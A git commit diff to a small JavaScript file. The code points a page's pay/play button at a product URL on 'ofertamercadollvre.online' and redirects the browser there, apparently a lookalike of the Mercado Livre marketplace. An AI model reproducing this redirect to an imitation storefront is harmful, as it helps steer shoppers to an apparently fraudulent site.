66eeef80df919c61d783c1900513e49085d9940b
Kelvin Santos <23528635+santoskelvin@users.noreply.github.com>
2024-07-03 05:06:16 -0300

    qweqweqw

--- haha.js
+++ haha.js
@@ -1,19 +1,19 @@
+        // Função para redirecionar para o link atual do span
+        function redirecionarParaLink() {
+            var link = document.getElementById('playbutton').getAttribute('href');
+            if (link) {
+                window.location.href = link;
+            }
+        }
 
-		// Função para redirecionar para o link atual do span
-		function redirecionarParaLink() {
-			var link = document.getElementById('paybutton').getAttribute('href');
-			if (link) {
-				window.location.href = link;
-			}
-		}
-		
-		// Função para mudar dinamicamente o link
-		function alterarLinkNovo(linkNovo) {
-			var botao = document.getElementById('paybutton');
-			if (botao) {
-				botao.setAttribute('href', linkNovo);
-			}
-		}
-		
-		// Alterar dinamicamente para 'pay2.html'
-		alterarLinkNovo('https://ofertamercadollvre.online/products/som-automotivo-pioneer-mvh-s218bt-com-usb-bluetooth-e-radio');
+        // Função para mudar dinamicamente o link
+        function alterarLinkNovo(linkNovo) {
+            var botao = document.getElementById('playbutton');
+            if (botao) {
+                botao.setAttribute('href', linkNovo);
+            }
+        }
+
+        // Alterar dinamicamente para o novo link
+        alterarLinkNovo('https://ofertamercadollvre.online/products/som-automotivo-pioneer-mvh-s218bt-com-usb-bluetooth-e-radio');
+    
